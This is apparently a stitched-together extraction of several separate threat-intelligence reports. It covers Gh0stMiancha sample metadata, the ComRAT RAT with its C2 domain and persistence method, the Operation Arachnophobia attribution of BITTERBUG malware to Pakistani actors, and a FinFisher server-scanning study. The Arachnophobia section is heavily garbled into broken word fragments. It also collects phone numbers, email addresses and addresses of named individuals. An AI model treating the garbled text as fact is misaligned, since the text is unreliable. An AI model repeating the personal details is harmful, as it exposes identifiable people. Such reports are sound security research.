Size ( bytes )             10299
Compile Time             2013 - 11 - 26 09:34:10 UTC
In - the - wild Filenames    install.ocx
Obfuscated TrojanLoader : W64/Gh0stMiancha
Size ( bytes )             12347
Compile Time             N / A
In - the - wild Filenames    dll64.tmp
Size ( bytes )             12347
Compile Time             2013 - 11 - 26 11:47:39 UTC
In - the - wild Filenames    install.ocx
Obfuscated Trojan : W32/Gh0stMiancha
Size ( bytes )             169019
Compile Time             N / A
In - the - wild Filenames    instructions.pdf
Trojan : W32/Gh0stMiancha
Size ( bytes )             169019
Compile Time             2013 - 12 - 06 08:08:28 UTC
In - the - wild Filenames    N / A
Obfuscated Trojan : W64/Gh0stMiancha
Size ( bytes )             233019
Compile Time             N / A
In - the - wild Filenames    instructions64.pdf
Trojan : W64/Gh0stMiancha
Size ( bytes )             233019
Compile Time             2013 - 12 - 06 08:10:34 UTC
In - the - wild Filenames    N / A
Context Information Security - Threat Intelligence - threat@contextis.co.uk
London ( HQ )             Cheltenham                  Düsseldorf               Melbourne
London E14 9TP          Cheltenham GL53 7LS         40215 Düsseldorf         Melbourne VIC 3000
United Kingdom          United Kingdom              Germany                  Australia
The Uroburos case : new sophisticated RAT identified
In February 2014 , the experts of the G DATA SecurityLabs published an analysis of Uroburos , the
As reported earlier this year , Agent . BTZ used the same encoding key and the installation log file name as Uroburos .
Another very interesting fact : the attackers use COM Object hijacking , the same persistence mechanism as
Taken everything into consideration , the indications we saw during our analyzes lead to the supposition that the
Dropper
The analyzed file is the latest version we identified : v3.26 . The version identification is described in the chapter “ Log
File installation
The first task of the malware is to install the file credprov.tlb in % APPDATA%\Microsoft\. This file is the main
The second file is shdocw.tlp . The two files are Microsoft Windows dynamic libraries .
Persistence
To be started during the boot process of the infected machine , the malware creates the following registry key :
This registry key is used to associate the library shdocvw.tlp to the object 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1
Dropper ’s log file
If the version of the malware is older than 3.26 , the dropper creates an additional file called winview.ocx . We
Here is the decoded log file content :
Log begin : 06.11.2014 22:55:55
Ok
We can notice that the malware checks if an older version is installed on the system and if this is the case , the
Execution flow and features
During the startup of the infected machine , the shdocvw.tlp library is loaded into all processes . If the process is
Log files
Two log files are created during the malware execution : mskfp32.ocx and msvcrtd.tlb . If the malware version is
We can identify the version of the malware thanks to the PVer flag . The command and control server information is
For example , in the analyzed sample the CC is : weather-online.hopto.org . This domain is far from unknown , as it
If the malware version in lower than 3.26 , the XML log file contains the command and control server information :
Summary
Let us summarize the similarities and differences between Agent . BTZ , Uroburos and ComRAT as far as we can :
Similarities :
Before version 3.26 :
On all versions :
Some parts of the code are exactly the same ( appears to be copy & paste )
That is the reason why the sample is detected as Uroburos ( aka Turla ) . The same code was used by Agent . BTZ
Command and control server domains are shared between Uroburos and ComRAT .
Differences :
In version 3.26 , the author changed the key and remove the known file name
This action can be an indication for the developer ’s effort to hide this connection
The main difference is the design
Agent . BTZ is a common RAT , a simple library executed on an infected machine . ComRAT is more complex
These differences , mainly the more complex design , lead us to give this malware a new name .
The analyzed dropper of v3.25 has a compilation date of February 6th 2014 . The more recent dropper of v3.26 ,
Conclusion
This analysis shows that even after the Uroburos publication in February 2014 , the group behind this piece of
Uroburos and the RAT Agent . BTZ as much as possible . However , we can still follow the evolution of the malware by
The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet
We will definitely keep our ears and eyes open and continue analyzing .
Paths
Registry
Command and control
Related articles :
October 30th 2014 : COM Object hijacking : the discreet way of persistence
June 2nd 2014 : Analysis of Uroburos , using WinDbg
May 13th 2014 : Uroburos rootkit : Belgian Foreign Ministry stricken
March 3rd 2014 : Uroburos - Deeper travel into kernel protection mitigation
February 28th 2014 : Uroburos - highly complex espionage software with Russian roots
Operation
Arachnophobia
Caught in the Spider ’s Web
Rich Barger | Cyber Squared Inc.
Mike Oppenheim | FireEye Labs
Chris Phillips | FireEye Labs
Contents
Team Introduction ....................................................................................................................................................... 1
Key Findings .................................................................................................................................................................. 1
Summary ....................................................................................................................................................................... 1
Backstory ...................................................................................................................................................................... 2
Technical Observations ............................................................................................................................................... 8
Conclusion .................................................................................................................................................................... 11
Appendix A : Malware Details ................................................................................................................................... 12
Appendix B : MD5 Hashes and Malware Table ........................................................................................................ 17
Appendix C : VPSNOC Email Header Analysis ....................................................................................................... 20
Appendix D : Inconsistencies Observed ................................................................................................................... 21
Appendix E : VPSNOC & Digital Linx Associations ................................................................................................. 23
Appendix F : Personas ................................................................................................................................................. 24
Persona # 1 ................................................................................................................................................................................ 24
Persona # 2 ................................................................................................................................................................................ 27
Appendix G : Tranchulas ........................................................................................................................................... 30
Digital Appendix 1 : Research Collateral ................................................................................................................... 32
Digital Appendix 2 : Raw Email Communications ................................................................................................... 33
Digital Appendix 3 : Screenshot Archives ................................................................................................................ 34
Digital Appendix 4 : Maltego Visualization ............................................................................................................. 35
Team Introduction
Cyber Squared Inc. ’s ThreatConnect Intelligence Research Team ( TCIRT ) tracks a number of threat groups around the world .
Beginning in the summer of 2013 , TCIRT identified a suspected Pakistani - origin threat group . This group was revealed by TCIRT
Operation “ Arachnophobia ” . The following report is a product of collaborative research and threat intelligence sharing between
Cyber Squared Inc. ’s TCIRT and FireEye Labs .
Key Findings
Tranchulas is the name of a Pakistani security firm ; Umair Aziz is the name of a Tranchulas employee .
Summary
On August 2 , 2013 , the TCIRT published the blog “ Where There is Smoke , There is Fire : South Asian Cyber Espionage Heats
Up ” in which TCIRT identified custom malware , later dubbed BITTERBUG by FireEye , suspected to be linked to Pakistani - based
During the past year , we communicated with Tranchulas and the Pakistan - based hosting provider . Suspicious responses and
Tranchulas maintained that they were being framed , and that they were already aware of the activity prior to both our blog post
Backstory
Missouri . Based on public records , this organization appears to be a legal entity chartered to conduct business in Missouri.4
On July 24 , 2013 , TCIRT contacted the Kansas City - based hosting provider to notify them of the malicious activities emanating
Figure 2 : VPSNOC Response
While reviewing the metadata of VPSNOC ’s July 24 , 2013 email response , we noticed the email was sent from a + 0500 time zone .
This time zone usage is consistent with Pakistan ’s time zone.7
The TCIRT published details of the initial activity in the aforementioned blog post on August 2 , 2013 . Four days later on August 6 ,
Khan submitted “ Response_ThreatConnect.docx”9 as an explanation of the observed activity to both the media and the
Figure 3 : Screenshot ( image1.png ) included within Response_ThreatConnect.docx
As seen in Figure 3 the “ email message ” 10 was “ sent ” to VPSNOC from an unidentified tranchulas.com email address on “ Tue ,
Jul 21 , 2013 at 11:36 PM . ” July 21 , 2013 was not a Tuesday and in fact was a Sunday . The mismatched date suggests that this
The TCIRT responded to Mr. Khan ’s official explanation with a follow - up inquiry , offering Khan an opportunity to explain the notable
Astonished by this dismissal and deflection , TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas .
During our research into VPSNOC , we identified that it is actually based in , or conducts partial operations from within , Pakistan .
The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space ( Figure
Pakistan - based hosting company ( Figure 5 ) .
Figure 4 : Screenshot of VPSnoc.com About us page
Figure 5 : Digital Linx ( digitallinx.com )                              Figure 6 : Screenshot of DigitalLinx.net
Website indicating its location                                                 contact page
As seen in Figure 6 , the administrative email address is admin@digitallinx.org.13 This is the same registrant record for the
Town , Lahore Pakistan.20
The contact telephone number listed on Digital Linx’ web site is 925 - 665 - 1427 ( Figure 6 ) , and is also used in the WHOIS record
The domain defiantmarketing.com is registered to Abunasar Khan . The registration lists VPSNOC as the registrant organization ,
Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan.24
Figure 7 : Blackhatworld advertisement identifying VPSNOC as a Digital Linx subdivision25
Additional research into Abunasar Khan identified several registered domains and fragments of his online presence . Based on his
In addition , Abunasar Khan ’s Google+ profile revealed connections to at least one Tranchulas employee , Hamza Qamar29 and a
Digital Linx employee , Shoaib Riaz.30 31Hamza Qamar , the Team Lead for Penetration Testing at Tranchulas , with whom TCIRT last
Hamza Qamar , the Penetration Testing employee from Tranchulas .
Figure 8 : Abunasar.net main page
Figure 9 : Qamar ’s only connection out of 40 + followers
Qamar indicated on his public LinkedIn profile that he “ engaged in system and enterprise level network and Web application
Though Tranchulas35 brands itself as a multi - national company , with respective addresses within the United Kingdom36 , the United
States37 , and New Zealand38 . We found evidence that these addresses are all associated with either virtual office spaces or
For further background information on these personas , please see Appendix F : Personas .
The following is a summary of the relationships between the hosting organizations and Tranchulas :
Note : A walkthrough of our research is available in Appendices C , D and E.
Technical Observations
Metadata Analysis :
As mentioned earlier , during the email exchanged with Zubair Khan , he sent TCIRT a Microsoft Word document ( .docx ) . In
Decoys associated with BITTERBUG                                Tranchulas Documents
Figure 10 : Matching Document Author Metadata
While the author field of “ hp ” does n’t conclusively prove a relationship , it contributes to the body of circumstantial evidence which
Malware Analysis :
The
Apublically available
Libcurl
These
Blaunch , and communications . In
Appendix                  the
Singh ”
Malware            “ Tranchulas ”
Details .                  debug
Indian
Pakistan )
Indian
August
Government
These
As
The earliest evidence of w
Portable
Executable
Sarabjit
It
Indian
Indian
Gpost .
These BITTERBUG
Singh ”
Indian Government pensionreferences
As stated        in thedebug
Tranchulas
Studio   p arty
C:\Users\Tranchulas\Documents\Visual
Studio 2008\Projects\upload\Release\upload.pdb
Additional
June
July
The
Additional BITTERBUG
Additional
June            and
June
Jdifferent
The presence                               3
Tahe
The debug
Tranchulas
Ito           a aTranchulas
Security
Anamed
Aziz , who
Ndational
Security        path
University
Sciences
Tuechnology
National s
Oand      43
One of these samples     samples
U
I nformation
P akistan ’s
S ecurity
A i   nalyst
Osama
National
Bin
Laden .
University
Sciences
Technology45
One
C:\Users\Cert - India\Documents\Visual                                                                                                                                                                                                                                                       related
Studio                   to
Pakistan ’s
Osama
Bin
Laden .
C:\Users\Cert - India\Documents\Visual
After publication        After
Studio
T2013 ,          ranchulas
August
October ( a new
Sfollowing
After
Otctober
Interestingly ,
Between               September and
December , we observed more variations of BITTERBUG and its support components in terms of packaging , host - based
B ITTERBUG
September
C(2
Between
Interestingly ,
Appendix
Aa :
Mwalware
Daetails
C2
September
December ,
A
A :
Malware
Details
Figure
Generic
Debug
Path
Figure 11 : Generic Debug Path
Between
December
March
One
December
Between December 2013 and late March 2014 , we observed several new lures used in BITTERBUG self - extracting RAR ( SFXRAR )
December
Devyani
Khobragade ,               47
United
December arrest States .
Khobragade ,        47
March
March 2014 disappearance
Malaysia
Malaysia
Airlines
Flight
Flight
Paakistan-­‐
Pakistan - related hijacking ) .
This SFXRAR contained            hijacking ) .
Interestingly ,
I nterestingly ,
S FXRAR ’s
A : Malwareevent ;
Details .
We
Appendix
A :
Malware
Details .
Figure 12 : Screenshot of Indian diplomat arrest decoy PDF
Conclusion
Operation Arachnophobia consists of an apparent targeted exploitation campaign , dating back to early 2013 , using the
After the August 6 , 2013 blog , Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG
August 2013 with subtle changes that further generalized debug paths . It was this chain of events that served as a catalyst for
While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point
On the surface , BITTERBUG serves as an example of how threat actors mask their operations across social , cultural and
Timeline of BITTERBUG characteristics vs . ThreatConnect events
Details
Upon execution the self - extracting RAR may install < BITTERBUG>.exe and the following DLLs :
The self - extracting RAR may install the following benign configuration files :
Figure 13 : Example recovery.txt file from VMware virtual machine
Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised
Host : < c2_location >
Accept : * / *
Content - Length : 25
Content - Type : application / x - www - form - urlencoded
Figure 14 : Initial C2 beacon
If the C2 server responds with a filename , the filename received is deleted from % APPDATA%\Microsoft < FILE_NAME_FROM _
C2>. The purpose of this command might be to delete older versions of BITTERBUG , although we have not observed this
Request URI                                                     Download Path
Table 1 : Files downloaded by the backdoor
Next , BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions : .doc ,
Finally , BITTERBUG typically uploads the running process list , document file list , and all documents to the following URI :
Host - Based Signatures
File System Residue
The malware may create the following files :
Network - Based Signatures
File Manipulations
We observed other interesting operational security - oriented challenges in the post - blog post samples . In one case , an actor
Figure 15 : Original file content for 7588ff900e32145cbcbc77837237aef8
Figure 16 : Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6
As these samples point to , we also observed use of the C++ Boost libraries , which introduced a new file path to monitor for
Figures
Screenshots
Figures 17 and 18 : Screenshots from                 6e8c4d2d5d4e5e7853a1842b04a6bfdf
In
In both cases , it is possible    that the
Cert-­‐
India ”
Felement .
For example ,            of
Alternatively , a
A lternatively ,
C:\Users\Cert-
Compile Time             Debug Paths
Imphash                    Compile Time
The Kansas - City - based hosting provider sent an introductory email message on July 24th , 2013 at 1500 CDT and would be
Analysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 + 0500 GMT , which
These two examples highlight that VPSNOC ’s inbound and outbound email communications consistently utilized a + 0500
Pakistani timezone .
Due to the apparent Pakistani nexus within the BITTERBUG malware and the Pakistan time zone consistently observed within
Inconsistency # 1 : Day & Date Misalignment within image1.png Screenshot
Our review of the “ Response_ThreatConnect.docx”53 focused in on the email screenshot ( Figure 3 ) image1.png54 that Khan
July 21 , 2013 was a Sunday , not a Tuesday . “ Tuesday ” would have pre - dated our official notification that occurred on Wednesday
July 24 , 2013 , and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-
Mr. Hamza Qamar55 , a Penetration Testing Team Lead at Tranchulas , who later responded56 with a simple denial that the email
Inconsistency # 2 : Awareness of Withheld Information
The email screenshot ( image1.png ) from within the Tranchulas response demonstrated awareness of information that we initially
Inconsistency # 3 : Tranchulas Direct Notification
The Tranchulas response indicates that “ Tranchulas’ research team was already aware of this incident before publication
Public registration of the 199.91.173.43 reveals the Kansas - City - based hosting provider as the official registrant and owner
On August 15 , 2013 , Hamza Qamar ’s response to TCIRT ’s follow up inquiry to the observed inconsistencies redirected TCIRT
Inconsistency # 4 : Tranchulas obtains similar response that TCIRT obtained
Within the “ Response_ThreatConnect.docx “ the image “ image1.png ” contains an undated response from VPSNOC to the
The TCIRT found it unusual that neither the Kansas - City - based service provider or VPSNOC personnel ever indicated either way
Inconsistency # 5 : Similar Document Metadata Properties
Analysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations ,
While the author field of “ hp ” does n’t conclusively prove a relationship , it contributes to a body of circumstantial evidence which
According to the vpsnoc.com website “ In 2007 five VPS experts decided to invest in their very own private rack space in the heart
Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant
The domain digitallinx.com is registered to Perasona # 1.66 67 68 69 He uses email addresses naseer@digitallinx.com and nbhatti@
Outsourcing Company based in Pakistan ” .
Open source research of the phone number 925 - 665 - 1427 indicates that it is also used within site content as a phone number for
Islamabad Federal 44000 . The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services .
Within a January 2009 posting to a Debian users forum , Persona # 2 sends an email from the abunasar@yahoo.com with a reply - to as
In an April 2012 post to blackhatworld.com , a user with the alias “ agnosticon ” posted promotional codes for VPSNOC hosting
Within the posting the user “ agnosticon ” included an image which was an actual advertisement that was hosted at http://vpsnoc .
Persona # 1 :
Muhammad Naseer Bhatti ’s LinkedIn profile indicates that he is currently the founder for Digital Linx LLC and vBilling ( vbilling.org )
Both passive DNS sources as well as Robtex84 highlight this overlapping infrastructure.85
From September 7 - 9 , 2011 , Tranchulas in cooperation with the Pakistan National University of Sciences and Technology86
Figure 17 : Muhammad Nasser Tranchulas CPTP Registration Point of Contact
Within the CPTP event registration contact information for Muhammad Naseer was listed next to a Tranchulas office number ( 051-
Nasser , Penetration Tester at Tranchulas was interviewed93 . A Mohammed Nasser may also be directly affiliated94 with Tranchulas .
Figure 18 : Muhammad Nasser Bhatti Dropping Family Name
This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer . It is unknown if this is the same
Muhammad Naseer that is associated with VPSNOC ’s parent company Digital Linx , the Pakistan - based service provider which
Persona # 2 :
Abunasar Khan also maintains the aliases “ agnosticon”95 and “ agnostic”96 in addition to the email addresses abunasar@yahoo .
Khan registered a variety of domains , many of which use his abunasar.net99 for name services and abunasar.yahoo.com within
Figure 19 : SOA record for defiantmarketing.com ( July 2014 )
Figure 20 : SOA Record for vpsnoc.com ( August 2013 )
Abunasar Khan registered abunasar.net and previously ( May 2007 ) and maintained whitehate.org101 , which have both been used
Tranchulas employees.103 104 105 The pure.whitehate.org domain has also been previously associated with Khan , examples can be
Ironically , in February 2011 , Khan ’s Rootkit.com user profile was compromised revealing his profile ’s username , password hash ,
Khan specified the name “ anony mo us ” when registering the profile . As of 16 August 2013 , a Pastebin post contained details of
Research of the 03215488881 cell phone number yields a user profile “ abunasark ” in an April 2009 posting.111 Khan posts
Khan ’s affinity for Suzuki Baleno cars is made obvious in a May 2009 registration for clubaleno.co.uk that was registered by Khan
Later in a June 2009 posting , Khan using the alias “ agnostic ” attempts to sell the domain clubaleno.co.uk and uses his abunasar@
Khan is also observed using the alias “ agnosticon ” and a Toyota Racing Development avitar within posts to blackhatworld.com
The Google+ profile for Khan119 reveals established social network links to a Team Lead for Penetration Testing at Tranchulas and
Nasser Bhatti.121
The Tranchulas website122 states that they provide a range of security services and training to include penetration and offensive
Although Tranchulas125 brands itself as a multi - national company , their respective operating addresses within United Kingdom126
Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex129 on Sir Agha Khan Road F-5/1
Islamabad 44000 . The Evacuee Trust Complex is also known as Software Technology Park 2130 or STP2 and hosts a variety131 of
The Tranchulas employee , Hamza Qamar , that handled the response to our inquiry has a public LinkedIn132 profile that states that
It is likely that Tranchulas provides services to the Pakistani government . The offensive cyber initiative services offered by
Tranchulas is offered to “ national - level cyber security programs ” suggesting a commercial demand from “ national - level ” customers .
The stated purpose and intent of the Tranchulas “ Cyber Ranges ” P@sha ICT 2011 awards video suggests the ranges were
Khan using an official Pakistani government address with his zubair@tranchulas.com email address indicates that Khan may have
Historic Whois registration records for the domains textcrypter.com133 , taggnation.com134 , bookadoconline.com135 and saadiakhan .
Khan used the address 15-B , Mehran Block of the Gulshan - e - Jinnah F-5/1 Islamabad Pakistan for the domains .
In an April 2008 Request for Proposals , the Pakistan Public Works Department issued a tender138 for the Constriction of
Government Servant Quarters and Garages at Gulshan - e - Jinnah Complex F-5/1 Islamabad . Later in May of 2010 within a
Pakistani Senate139 question and answer session , the Gulshan - e - Jinnah Complex was cited under Federal Lodges / Hostels in
Islamabad under the control of Pakistan Ministry for Housing and Works . A December 2010 TheNews Pakistan ran a story140
Complex to the Tranchulas offices within the Evacuee Trust Complex .
Within a May 2013 interview142 Khan specified that he comes from a family with a strong military background . He detailed his
Database and Registration Authority ( NADRA ) .
Digital Appendix 1 : Research Collateral
Digital Appendix 1 contains additional research collateral collected when conducting Operation Arachnophobia research .
Digital Appendix 2 : Raw Email Communications
Digital Appendix 2 contains raw email communications . These .eml files include raw SMTP headers , content and attachments .
Digital Appendix 3 : Screenshot Archives
Digital Appendix 3 contains screenshots of web content used to conduct analysis .
Digital Appendix 4 : Maltego Visualization
Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation
Arachnophobia research .
This post describes the results of a comprehensive global Internet scan for the command and control servers of FinFisher 's surveillance software .
It also details the discovery of a campaign using FinFisher in Ethiopia used to target individuals linked to an opposition group .
Additionally , it provides examination of a FinSpy Mobile sample found in the wild , which appears to have been used in Vietnam .
This continues the theme of FinSpy deployments with strong indications of politically - motivated targeting .
We found an Android FinSpy Mobile sample in the wild with a command & control server in Vietnam that also exfiltrates text messages to a local phone number .
Although touted as a `` lawful interception '' suite for monitoring criminals , FinFisher has gained notoriety because it has been used in targeted attacks against human rights campaigners and opposition activists in countries with questionable human rights records .
In late July 2012 , we published the results of an investigation into a suspicious e - mail campaign targeting Bahraini activists .
We analyzed the attachments and discovered that they contained the FinSpy spyware , FinFisher 's remote monitoring product .
The attachments we analyzed sent data to a command & control server inside Bahrain .
This discovery motivated researchers to search for other command & control servers to understand how widely FinFisher might be used .
Claudio Guarnieri at Rapid7 ( one of the authors of this report ) was the first to search for these servers .
He fingerprinted the Bahrain server and looked at historical Internet scanning data to identify other servers around the world that responded to the same fingerprint .
Rapid7 published this list of servers , and described their fingerprinting technique .
Other groups , including CrowdStrike and SpiderLabs also analyzed and published reports on FinSpy .
Immediately after publication , the servers were apparently updated to evade detection by the Rapid7 fingerprint .
We devised a different fingerprinting technique and scanned portions of the internet .
We confirmed Rapid7 's results , and also found several new servers , including one inside Turkmenistan 's Ministry of Communications .
We published our list of servers in late August 2012 , in addition to an analysis of mobile phone versions of FinSpy .
Nevertheless , via analysis of existing samples and observation of command & control servers , we managed to enumerate yet more fingerprinting methods and continue our survey of the internet for this surveillance software .
We describe the results in this post .
Civil society groups have found cause for concern in these findings , as they indicate the use of FinFisher products by countries like Turkmenistan and Bahrain with problematic records on human rights , transparency , and rule of law .
In an August 2012 response to a letter from UK - based NGO Privacy International , the UK Government revealed that at some unspecified time in the past , it had examined a version of FinSpy , and communicated to Gamma that a license would be required to export that version outside of the EU .
Gamma has repeatedly denied links to spyware and servers uncovered by our research , claiming that the servers detected by our scans are `` not … from the FinFisher product line .
In February 2013 , Privacy International , the European Centre for Constitutional and Human Rights ( ECCHR ) , the Bahrain Center for Human Rights , Bahrain Watch , and Reporters Without Borders filed a complaint with the Organization for Economic Cooperation and Development ( OECD ) , requesting that this body investigate whether Gamma violated OECD Guidelines for Multinational Enterprises by exporting FinSpy to Bahrain .
The complaint called previous Gamma statements into question , noting that at least two different versions ( 4.00 and 4.01 ) of FinSpy were found in Bahrain , and that Bahrain 's server was a FinFisher product and was likely receiving updates from Gamma .
This complaint , as laid out by Privacy International states that Gamma : - failed to respect the internationally recognised human rights of those affected by [ its ] activities - caused and contributed to adverse human rights impacts in the course of [ its ] business activities - failed to prevent and mitigate adverse human rights impacts linked to [ its ] activities and products , and failed to address such impacts where they have occurred - failed to carry out adequate due diligence ( including human rights due diligence ) ; and - failed to implement a policy commitment to respect human rights .
According to recent reporting , German Federal Police appear to have plans to purchase and use the FinFisher suite of tools domestically within Germany .
Meanwhile , findings by our group and others continue to illustrate the global proliferation of FinFisher 's products .
Research continues to uncover troubling cases of FinSpy in countries with dismal human rights track records , and politically repressive regimes .
Most recently , work by Bahrain Watch has confirmed the presence of a Bahraini FinFisher campaign , and further contradicted Gamma 's public statements .
This post adds to the list by providing an updated list of FinSpy Command & Control servers , and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam .
We present these updated findings in the hopes that we will further encourage civil society groups and competent investigative bodies to continue their scrutiny of Gamma 's activities , relevant export control issues , and the issue of the global and unregulated proliferation of surveillance malware .
Around October 2012 , we observed that the behavior of FinSpy servers began to change .
Servers stopped responding to our fingerprint , which had exploited a quirk in the distinctive FinSpy wire protocol .
We believe that this indicates that Gamma either independently changed the FinSpy protocol , or was able to determine key elements of our fingerprint , although it has never been publicly revealed .
In the wake of this apparent update to FinSpy command & control servers , we devised a new fingerprint and conducted a scan of the internet for FinSpy command & control servers .
This scan took roughly two months and involved sending more than 12 billion packets .
Our new scan identified a total of 36 FinSpy servers , 30 of which were new and 6 of which we had found during previous scanning .
The servers operated in 19 different countries .
Among the FinSpy servers we found , 7 were in countries we had n't seen before .
New Countries : Canada , Bangladesh , India , Malaysia , Mexico , Serbia , Vietnam In our most recent scan , 16 servers that we had previously found did not show up .
We suspect that after our earlier scans were published the operators moved them .
Many of these servers were shut down or relocated after the publication of previous results , but before the apparent October 2012 update .
We no longer found FinSpy servers in 4 countries where previous scanning identified them ( Brunei , UAE , Latvia , and Mongolia ) .
Taken together , FinSpy servers are currently , or have been present , in 25 countries : Australia , Bahrain , Bangladesh , Brunei , Canada , Czech Republic , Estonia , Ethiopia , Germany , India , Indonesia , Japan , Latvia , Malaysia , Mexico , Mongolia , Netherlands , Qatar , Serbia , Singapore , Turkmenistan , United Arab Emirates , United Kingdom , United States , Vietnam .
Importantly , we believe that our list of servers is incomplete due to the large diversity of ports used by FinSpy servers , as well as other efforts at concealment .
Moreover , discovery of a FinSpy command and control server in a given country is not a sufficient indicator to conclude the use of FinFisher by that country 's law enforcement or intelligence agencies .
In some cases , servers were found running on facilities provided by commercial hosting providers that could have been purchased by actors from any country .
The table below shows the FinSpy servers detected in our latest scan .
We list the full IP address of servers that have been previously publicly revealed .
For active servers that have not been publicly revealed , we list the first two octets only .
Releasing complete IP addresses in the past has not proved useful , as the servers are quickly shut down and relocated .
Several of these findings are especially noteworthy : - Eight servers are hosted by provider GPLHost in various countries ( Singapore , Malaysia , Australia , US ) .
However , we observed only six of these servers active at any given time , suggesting that some IP addresses may have changed during our scans .
The server is located in a range of 16 addresses registered to `` Qtel – Corporate accounts – Government Relations .
We analyzed a recently acquired malware sample and identified it as FinSpy .
The malware uses images of members of the Ethiopian opposition group , Ginbot 7 , as bait .
The malware communicates with a FinSpy Command & Control server in Ethiopia , which was first identified by Rapid7 in August 2012 .
The server has been detected in every round of scanning , and remains operational at the time of this writing .
It can be found in the following address block run by Ethio Telecom , Ethiopia 's state - owned telecommunications provider : The server appears to be updated in a manner consistent with other servers , including servers in Bahrain and Turkmenistan .
The sample is similar to a previously analyzed sample of FinSpy malware sent to activists in Bahrain in 2012 .
Just like Bahraini samples , the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user .
This appears to be an attempt to trick the victim into believing the opened file is not malicious .
Here are a few key similarities between the samples : - The PE timestamp `` 2011 - 07 - 05 08:25:31 '' of the packer is exactly the same as the Bahraini sample .
In this case the picture contains photos of members of the Ethiopian opposition group , Ginbot 7 .
Controversially , Ginbot 7 was designated a terrorist group by the Ethiopian Government in 2011 .
The Committee to Protect Journalists ( CPJ ) and Human Rights Watch have both criticized this action , CPJ has pointed out that it is having a chilling effect on legitimate political reporting about the group and its leadership .
The existence of a FinSpy sample that contains Ethiopia - specific imagery , and that communicates with a still - active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy .
We recently obtained and analyzed a malware sample and identified it as FinSpy Mobile for Android .
The sample communicates with a command & control server in Vietnam , and exfiltrates text messages to a Vietnamese telephone number .
The FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS , Android , Windows Mobile , Symbian and Blackberry .
Its features are broadly similar to the PC version of FinSpy identified in Bahrain , but it also contains mobile - specific features such as GPS tracking and functionality for silent ' spy ' calls to snoop on conversations near the phone .
An in - depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post : The Smartphone Who Loved Me : FinFisher Goes Mobile ? The sample included a configuration file that indicates available functionality , and the options that have been enabled by those deploying it : Interestingly , the configuration file also specifies a Vietnamese phone number used for SMS based command and control : The command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi : This server was active until very recently and matched our signatures for a FinSpy command and control server .
Both the command & control server IP and the phone number used for text - message exfiltration are in Vietnam which indicates a domestic campaign .
This apparent FinSpy deployment in Vietnam is troubling in the context of recent threats against online free expression and activism .
In 2012 , Vietnam introduced new censorship laws amidst an ongoing harassment , intimidation , and detention campaign against of bloggers who spoke out against the regime .
This culminated in the trial of 17 bloggers , 14 of whom were recently convicted and sentenced to terms ranging from 3 to 13 years .
Companies selling surveillance and intrusion software commonly claim that their tools are only used to track criminals and terrorists .
Yet a growing body of evidence suggests that these tools are regularly obtained by countries where dissenting political activity and speech is criminalized .
Our findings highlight the increasing dissonance between Gamma 's public claims that FinSpy is used exclusively to track `` bad guys '' and the growing body of evidence suggesting that the tool has and continues to be used against opposition groups and human rights activists .
While our work highlights the human rights ramifications of the mis - use of this technology , it is clear that there are broader concerns .
A global and unregulated market for offensive digital tools potentially presents a novel risk to both national and corporate cyber - security .
On March 12th , US Director of National Intelligence James Clapper stated in his yearly congressional report on security threats : '' … companies develop and sell professional - quality technologies to support cyberoperations – often branding these tools as lawful - intercept or defensive security research products .
Foreign governments already use some of these tools to target U.S .
Our latest findings give an updated look at the global proliferation of FinSpy .
We identified 36 active FinSpy command & control servers , including 30 previously - unknown servers .
Our list of servers is likely incomplete , as some FinSpy servers employ countermeasures to prevent detection .
Including servers discovered last year , we now count FinSpy servers in 25 countries , including countries with troubling human rights records .
This is indicative of a global trend towards the acquisition of offensive cyber - capabilities by non - democratic regimes from commercial Western companies .
The Vietnamese and Ethiopian FinSpy samples we identified warrant further investigation , especially given the poor human rights records of these countries .
The fact that the Ethiopian version of FinSpy uses images of opposition members as bait suggests it may be used for politically influenced surveillance activities , rather than strictly law enforcement purposes .
The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server .
This further validates our scanning results , and calls into question Gamma 's claim that such servers are `` not … from the FinFisher product line .
While the sale of such intrusion and surveillance software is largely unregulated , the issue has drawn increased high - level scrutiny .
In September of last year , the German foreign minister , Guido Westerwelle , called for an EU - wide ban on the export of such surveillance software to totalitarian states .
In a December 2012 interview , Marietje Schaake ( MEP ) , currently the rapporteur for the first EU strategy on digital freedom in foreign policy , stated that it was `` quite shocking '' that Europe companies continue to export repressive technologies to countries where the rule of law is in question .
We urge civil society groups and journalists to follow up on our findings within affected countries .
We also hope that our findings will provide valuable information to the ongoing technology and policy debate about surveillance software and the commercialisation of offensive cyber - capabilities .
Syria 's opposition has faced persistent targeting by Pro - Government Electronic Actors ( PGEAs ) throughout the Syrian civil war .
A pro - government group calling itself the Syrian Electronic Army has gained visibility in recent months with high profile attacks against news organizations .
Meanwhile , Syrian activists continue to be targeted with online attacks apparently for the purposes of accessing their private communications and stealing their secrets .
Throughout 2012 , attacks against the Syrian opposition were documented in an extensive series of blog posts by Morgan Marquis - Boire and Eva Galperin with the help of the Electronic Frontier Foundation .
Many others have also contributed to research on Syrian malware , from Telecomix to a range of security companies .
